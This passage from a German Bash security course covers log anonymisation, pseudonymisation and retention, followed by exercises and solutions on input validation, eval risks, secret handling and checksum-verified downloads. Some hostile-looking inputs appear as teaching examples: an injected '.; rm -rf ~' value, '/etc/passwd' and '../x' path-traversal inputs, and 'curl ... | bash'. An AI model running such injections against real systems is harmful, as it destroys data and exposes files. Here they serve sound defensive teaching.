}
echo "--- maskiert:"; anonymisiere < zugriff.log

# --- 2. Pseudonymisieren: gleicher Wert -> gleiches Kuerzel (verknuepfbar, nicht lesbar)
SALZ="geheimes-salz-aus-secret-store"          # in der Praxis NICHT im Skript (Modul 8.4)
pseudonym() { printf '%s' "$SALZ$1" | sha256sum | cut -c1-10; }
echo "--- pseudonymisiert (Nutzer + Anzahl Zugriffe):"
awk '{print $3}' zugriff.log | while IFS= read -r mail; do pseudonym "$mail"; done | sort | uniq -c

# --- 3. Export minimieren: nur Tag und Pfad, keine Personenmerkmale
echo "--- Export nur mit Datum und Pfad:"
awk '{print substr($1,1,10), $5}' zugriff.log

# --- 4. Retention: Logs aelter als N Tage loeschen (hier simuliert mit touch -d)
mkdir archiv
touch -d '120 days ago' archiv/alt.log
touch -d '10 days ago'  archiv/neu.log
loesche_abgelaufene() {                        # loesche_abgelaufene VERZ TAGE
    local verz="${1:?}" tage="${2:?}" n
    n="$(find "$verz" -type f -name '*.log' -mtime "+$tage" -print -delete | wc -l)"
    echo "Retention: $n Datei(en) aelter als $tage Tage geloescht"
}
loesche_abgelaufene archiv 90
ls archiv
```

Die Funktion `anonymisiere` verwendet zwei Ersetzungsregeln mit erweiterten regulären Ausdrücken (Modul 5.8): Die erste behält die ersten drei Oktette einer IPv4-Adresse und setzt das letzte auf `0`; die zweite behält vom lokalen Teil einer E-Mail-Adresse nur das erste Zeichen und die Domain. Das `pseudonym` bildet den Hash aus Salz und Wert und kürzt ihn; gleiche Adressen ergeben das gleiche Kürzel, sodass man zählen und verknüpfen kann, ohne die Adresse zu zeigen. Das Salz ist hier nur der Anschaulichkeit halber im Skript; in der Praxis ist es ein Geheimnis und kommt aus einem Secret Store (Modul 8.4). Für ernsthafte Pseudonymisierung verwendet man ein Verfahren mit geheimem Schlüssel wie HMAC statt eines einfachen Hashes mit Salz, und beachtet, dass kurze, gut erratbare Werte (etwa Kundennummern) per Durchprobieren zurückgerechnet werden können. Schritt 3 zeigt die Exportminimierung mit `awk`. Die Retention-Funktion löscht mit `find -mtime +90 -delete` Dateien, die älter als 90 Tage sind, und meldet nur die Anzahl, nie den Inhalt. Beachten Sie, dass `-delete` nach `-print` stehen muss, damit alles gelistet wird, was gelöscht wird.

Typische Fehler: Erstens schreibt man ganze Anfragen, Eingaben oder Fehlerberichte mit Klartextdaten ins Log, weil es beim Debuggen praktisch war, und vergisst, es zu entfernen. Zweitens fehlt jede Aufbewahrungsfrist: Logs und Exporte wachsen unbegrenzt, weil nie jemand sie löscht. Drittens entsteht eine Kopie nach der anderen (Export auf dem Desktop, Anhang in einer Mail, Test-Datenbank mit Echtdaten) ohne Kontrolle. Viertens verwechselt man Pseudonymisierung mit Anonymisierung und gibt „anonymisierte“ Daten weiter, die sich leicht wieder zuordnen lassen. Fünftens ist die Löschung im Produktivsystem umgesetzt, aber nicht in Backups und Archiven, ohne dass dokumentiert ist, wann diese ablaufen. Sechstens werden Testdaten aus der Produktion kopiert, statt synthetische Daten oder maskierte Auszüge zu verwenden. Siebtens meint man, `rm` genüge für sensible Daten: Auf SSDs, Snapshots und Cloud-Speichern ist physisches Überschreiben nicht garantiert, sodass die Verschlüsselung der Daten und das Löschen des Schlüssels der verlässlichere Weg ist.

```bash
# falsch: komplette Anfrage samt Personendaten in einem dauerhaften Log
echo "$(date) Anmeldung: $email / $ip / $anfrage_body" >> /var/log/app.log

# richtig: nur, was fuer den Zweck noetig ist, gekuerzt bzw. pseudonymisiert
echo "$(date -u +%FT%TZ) Anmeldung user=$(pseudonym "$email") ip=${ip%.*}.0" >> /var/log/app.log
```

> **Merke**
>
> So wenig Personendaten wie möglich erheben, loggen und exportieren; maskieren, kürzen, pseudonymisieren. Aufbewahrungsfristen festlegen und automatisiert durchsetzen, inklusive Kopien und Backups. Pseudonymisiert ist nicht anonym. Rechtliche Fragen (Fristen, Rechtsgrundlagen) klären Fachleute: keine Rechtsberatung.

> **Praxisbeispiel**
>
> Ein Support-Team braucht Zugriffslogs zur Fehlersuche, aber keine Klarnamen. Ein Export-Skript maskiert E-Mail-Adressen, kürzt IP-Adressen und löscht Rohlogs nach 30 Tagen automatisch; der Betrieb kann Fehler weiterhin analysieren, während das Risiko bei einem Datenleck deutlich kleiner ist.

## 8.10 Übungsaufgaben zu Modul 08

Die Aufgaben 1 bis 4 prüfen das Verständnis, die Aufgaben 5 bis 8 sind praktische Programmieraufgaben mit steigender Schwierigkeit.

**Aufgabe 1.** Erklären Sie den Unterschied zwischen einer Allowlist und einer Blocklist bei der Eingabevalidierung. Warum ist eine Blocklist für Pfadangaben besonders unzuverlässig? Nennen Sie zwei Wege, wie jemand `[[ $name == *../* ]]` umgehen könnte, und wie man es richtig macht.

**Aufgabe 2.** Warum ist `eval "ls -l $verz"` gefährlich, und wie ersetzen Sie es? Zeigen Sie, wie man einen optionalen Schalter (`-a`) sicher an einen Befehl übergibt. Was bewirkt `-{}-` vor einem Eingabewert?

**Aufgabe 3.** Ein Kollege übergibt ein Passwort mit `mysql -pGEHEIM`. Nennen Sie zwei Stellen, an denen es dadurch sichtbar wird, und drei bessere Wege der Übergabe. Was geschieht mit einem Geheimnis, das versehentlich in die Git-Historie gelangt ist, und warum genügt ein neuer Commit nicht?

**Aufgabe 4.** Warum schützt HTTPS allein nicht vor einem manipulierten Download? Welche zwei zusätzlichen Maßnahmen gehören dazu, und woher soll die erwartete Prüfsumme stammen? Erklären Sie, warum `curl ... | bash` ein Problem ist.

**Aufgabe 5.** Schreiben Sie eine Funktion `sicherer_pfad BASIS NAME`, die einen Dateinamen per Allowlist prüft (Buchstaben, Ziffern, Punkt, Unterstrich, Bindestrich; 1 bis 64 Zeichen; nicht mit `-` oder `.` beginnend), mit `realpath -m` kanonisiert und nur Pfade unterhalb von BASIS ausgibt. Testen Sie mit `bericht.txt`, `../x`, `-rf`, `a b` und einem Symlink, der aus BASIS hinausführt.

**Aufgabe 6.** Schreiben Sie `secret-check.sh DATEI`, das prüft, ob eine Secret-Datei existiert, dem aktuellen Benutzer gehört und Rechte höchstens `600` hat; sonst Abbruch mit Exit-Code 3 und Meldung. Mit `-{}-fix` werden die Rechte korrigiert. Das Skript darf den Inhalt der Datei nie ausgeben.

**Aufgabe 7.** Schreiben Sie `lade-und-pruefe.sh URL ERWARTETE_SHA256 ZIELDATEI`: Es lädt mit `curl` (Optionen für Skripte: Fehler, Zeitlimit, nur HTTPS bei echten URLs; zum Testen ist `file://` erlaubt) in eine temporäre Datei im Zielverzeichnis, prüft die Summe, verschiebt bei Erfolg atomar, entfernt bei jedem Fehler die temporäre Datei und liefert die Exit-Codes 0, 2 (falsche Benutzung), 4 (Download), 5 (Prüfsumme).

**Aufgabe 8.** Schreiben Sie `bereinige-logs.sh LOGDATEI`, das eine Logdatei mit IP-Adressen und E-Mail-Adressen in eine bereinigte Kopie überführt (IPv4: letztes Oktett `0`; E-Mail: erstes Zeichen plus `***` und Domain), in der Kopie nur noch die Spalten Datum, bereinigte IP und Pfad ausgibt, die Kopie mit Rechten `640` anlegt und einen Audit-Eintrag (Zeit UTC, Akteur, Aktion, Ergebnis, ohne personenbezogene Inhalte) an eine Audit-Datei anhängt.

## 8.11 Lösungen zu den Übungsaufgaben

**Lösung zu Aufgabe 1.** Eine Allowlist beschreibt, was erlaubt ist, und weist alles andere zurück; eine Blocklist verbietet bekannte schlechte Muster und lässt alles übrige durch. Bei Pfaden gibt es sehr viele Spielarten (`..`, `....//`, Symlinks, kodierte Zeichen, absolute Pfade, Groß-/Kleinschreibung), und jede übersehene Variante ist ein Loch. `*../*` erkennt zum Beispiel nicht den Namen `/etc/passwd` (absolut, ohne `../`) und nicht einen Symlink `trick`, dessen Ziel außerhalb liegt. Richtig: Name per verankertem Muster prüfen, den Pfad mit `realpath -m` kanonisieren und danach prüfen, ob er mit dem Basisverzeichnis beginnt (`[[ $pfad == "$basis"/* ]]`).

**Lösung zu Aufgabe 2.** `eval` wertet die zusammengesetzte Zeichenkette als Shell-Code aus; enthält `$verz` etwa `.; rm -rf ~`, wird der zweite Befehl ausgeführt. Richtig: `ls -l -- "$verz"`. Für einen optionalen Schalter baut man ein Array: `opts=(-l); [[ $alle == 1 ]] && opts+=(-a); ls "${opts[@]}" -- "$verz"`. Das Array übergibt jedes Element als genau ein Argument. Das doppelte Minus beendet die Optionsauswertung, danach gelten alle Wörter als Operanden, auch wenn sie mit `-` beginnen.

**Lösung zu Aufgabe 3.** Das Passwort ist in der Prozessliste (`ps`, `/proc/<pid>/cmdline`) und in der Shell-History sichtbar; häufig auch in Logs, die Befehlszeilen aufzeichnen (Auditd, `set -x`). Bessere Wege: eine Konfigurationsdatei mit Rechten `600` (bei MySQL `-{}-defaults-extra-file`), eine Umgebungsvariable nur für diesen einen Befehl (`MYSQL_PWD`) oder die Übergabe über Standardeingabe beziehungsweise ein Secret Store. Ein eingechecktes Geheimnis bleibt in der Historie jedes Klons und Backups; ein neuer Commit entfernt es nur aus dem aktuellen Stand. Man muss es *widerrufen und ersetzen* (rotieren) und prüfen, ob es missbraucht wurde; das Bereinigen der Historie ist zusätzlich möglich, ersetzt die Rotation aber nicht.

**Lösung zu Aufgabe 4.** HTTPS sichert den Weg zum Server und dessen Identität, aber nicht den Inhalt: Ist der Server oder das Konto des Anbieters kompromittiert, liefert er die manipulierte Datei über eine einwandfreie Verbindung. Zusätzlich braucht es eine *Prüfsumme* (Integrität) und möglichst eine *Signatur* (Authentizität). Die erwartete Summe muss aus einer *unabhängigen* Quelle stammen: aus dem eigenen Repository, einer anderen Domain oder einem signierten Release-Eintrag, nicht aus einer Datei am selben Ort. `curl ... | bash` führt unbesehen aus, was geliefert wird; man kann den Inhalt weder prüfen noch auf Manipulation testen, und bei einem Verbindungsabbruch läuft womöglich ein abgeschnittener Befehl.

**Lösung zu Aufgabe 5.**

```bash
#!/usr/bin/env bash
# pfad-check.sh
set -euo pipefail

sicherer_pfad() {                    # sicherer_pfad BASIS NAME
    local basis_abs ziel
    basis_abs="$(realpath -- "$1")"
    [[ $2 =~ ^[A-Za-z0-9_][A-Za-z0-9._-]{0,63}$ ]] || {
        echo "ungueltiger Name: $2" >&2; return 1; }
    ziel="$(realpath -m -- "$basis_abs/$2")"
    case $ziel in
        "$basis_abs"/*) printf '%s\n' "$ziel" ;;
        *) echo "ausserhalb von $basis_abs" >&2; return 1 ;;
    esac
}

basis="$(mktemp -d)"; trap 'rm -rf -- "$basis"' EXIT
mkdir "$basis/b" "$basis/aussen"
echo ok > "$basis/b/bericht.txt"
echo geheim > "$basis/aussen/g.txt"
ln -s "$basis/aussen/g.txt" "$basis/b/link.txt"

for n in bericht.txt ../x -rf "a b" link.txt; do
    if p="$(sicherer_pfad "$basis/b" "$n" 2>/dev/null)"; then echo "OK      $n"
    else echo "ABGELEHNT $n"; fi
done
```

Der Name wird zuerst per Allowlist geprüft, danach kanonisiert. `../x`, `-rf` und `a b` scheitern bereits an der Allowlist; `link.txt` besteht sie, wird aber beim Kanonisieren zu einem Pfad außerhalb von `b` aufgelöst und deshalb abgelehnt. Nur `bericht.txt` wird akzeptiert.

**Lösung zu Aufgabe 6.**

```bash
#!/usr/bin/env bash
# secret-check.sh [--fix] DATEI
set -euo pipefail
fix=0
if [[ ${1:-} == --fix ]]; then fix=1; shift; fi
(( $# == 1 )) || { echo "Aufruf: $0 [--fix] DATEI" >&2; exit 2; }
datei="$1"

fail() { echo "FEHLER: $*" >&2; exit 3; }

[[ -f $datei && ! -L $datei ]] || fail "keine regulaere Datei (oder Symlink): $datei"
[[ "$(stat -c '%u' -- "$datei")" == "$(id -u)" ]] || fail "gehoert nicht dem aktuellen Benutzer"

rechte="$(stat -c '%a' -- "$datei")"
if (( (8#$rechte & ~8#600) != 0 )); then
    if (( fix )); then
        chmod 600 -- "$datei"
        echo "Rechte von $rechte auf 600 korrigiert"
    else
        fail "Rechte zu offen ($rechte), erlaubt hoechstens 600"
    fi
fi
echo "ok: $datei"
```

Das Skript liest nie den Inhalt der Datei, sondern nur Metadaten. Die Bit-Prüfung `(8#$rechte & ~8#600)` findet jedes zu viel gesetzte Bit (auch `400` ist zulässig, denn es ist eine Teilmenge von `600`). Symlinks werden abgelehnt, weil sonst die Rechte des Ziels geprüft oder verändert würden. Der Exit-Code 3 entspricht der Vorgabe.

**Lösung zu Aufgabe 7.**

```bash
#!/usr/bin/env bash
# lade-und-pruefe.sh URL ERWARTETE_SHA256 ZIELDATEI
set -euo pipefail
tmp=""
trap '[[ -z $tmp ]] || rm -f -- "$tmp"' EXIT
fehler() { local c=$1; shift; echo "FEHLER: $*" >&2; exit "$c"; }

(( $# == 3 )) || fehler 2 "Aufruf: $0 URL SHA256 ZIELDATEI"
url="$1"; erwartet="${2,,}"; ziel="$3"
[[ $erwartet =~ ^[0-9a-f]{64}$ ]] || fehler 2 "SHA256 muss 64 Hexzeichen haben"
zielverz="$(dirname -- "$ziel")"
[[ -d $zielverz ]] || fehler 2 "Zielverzeichnis fehlt: $zielverz"

opts=(--fail --silent --show-error --location --max-time 60 --retry 2)
case $url in
    https://*) opts+=(--proto '=https' --tlsv1.2) ;;
    file://*)  ;;                                   # nur zum Testen
    *) fehler 2 "nur https:// (oder file:// zum Testen) erlaubt" ;;
esac

umask 077
tmp="$(mktemp "$zielverz/.dl.XXXXXX")" || fehler 4 "temporaere Datei nicht anlegbar"
curl "${opts[@]}" -o "$tmp" -- "$url" || fehler 4 "Download fehlgeschlagen"

ist="$(sha256sum < "$tmp" | cut -d' ' -f1)"
[[ $ist == "$erwartet" ]] || fehler 5 "Pruefsumme stimmt nicht (erwartet $erwartet, erhalten $ist)"

chmod 644 "$tmp"
mv -f -- "$tmp" "$ziel"
tmp=""
echo "OK: $ziel"
```

Die Optionen für HTTPS werden nur bei `https://`-Adressen gesetzt, `file://` bleibt als Testweg erlaubt, alles andere wird abgelehnt (damit kein `http://`, `ftp://` oder Optionstext durchrutscht). Die temporäre Datei liegt im Zielverzeichnis, damit `mv` atomar ist; der `EXIT`-Trap räumt sie bei jedem Fehler auf, und `tmp=""` nach dem Verschieben verhindert, dass der Trap nach Erfolg etwas löscht. Der Test: Datei erzeugen, ihre Summe berechnen und das Skript mit `file://$PWD/datei` aufrufen; mit einer falschen Summe endet es mit Code 5, mit einer nicht vorhandenen Datei mit Code 4.

**Lösung zu Aufgabe 8.**

```bash
#!/usr/bin/env bash
# bereinige-logs.sh LOGDATEI
set -euo pipefail
(( $# == 1 )) || { echo "Aufruf: $0 LOGDATEI" >&2; exit 2; }
quelle="$1"
[[ -f $quelle ]] || { echo "Datei fehlt: $quelle" >&2; exit 2; }

ausgabe="${quelle%.log}.bereinigt.csv"
auditdatei="${AUDITDATEI:-./audit.log}"

audit() {                               # audit AKTION ERGEBNIS  (keine Inhalte, keine PII)
    printf '%s|%s|%s|%s|%s\n' "$(date -u +%FT%TZ)" "${SUDO_USER:-$(id -un)}" \
        "$1" "${quelle##*/}" "$2" >> "$auditdatei"
}

umask 027                               # Datei 640
if sed -E \
        -e 's/\b([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\.[0-9]{1,3}\b/\1.0/g' \
        -e 's/\b([A-Za-z0-9])[A-Za-z0-9._%+-]*@([A-Za-z0-9.-]+)/\1***@\2/g' -- "$quelle" |
   awk '{ print substr($1,1,10) "," $2 "," $5 }' > "$ausgabe"
then
    chmod 640 -- "$ausgabe"
    audit "log.anonymize" "ok"
    echo "geschrieben: $ausgabe"
else
    rm -f -- "$ausgabe"
    audit "log.anonymize" "fehler"
    exit 1
fi
```

Die Bereinigung geschieht in einer Pipeline aus `sed` (IP kürzen, E-Mail maskieren) und `awk` (nur Datum, bereinigte IP und Pfad). Der Pfad ist Feld 5 bei dem im Modul verwendeten Logformat (Zeit, IP, E-Mail, Methode, Pfad); bei einem anderen Format passt man die Feldnummer an. Der Audit-Eintrag enthält nur den Dateinamen ohne Verzeichnis, den Akteur, die Aktion und das Ergebnis, aber keine Inhalte, damit das Audit-Log selbst keine personenbezogenen Daten verbreitet. Weil die Pipeline in einer `if`-Bedingung steht, wird ein Fehler dort abgefangen und sauber protokolliert (Modul 6.1); `pipefail` sorgt dafür, dass auch ein Fehler in `sed` erkannt wird. Auch die Ausgabedatei erhält durch `umask 027` und `chmod 640` keine Weltrechte.
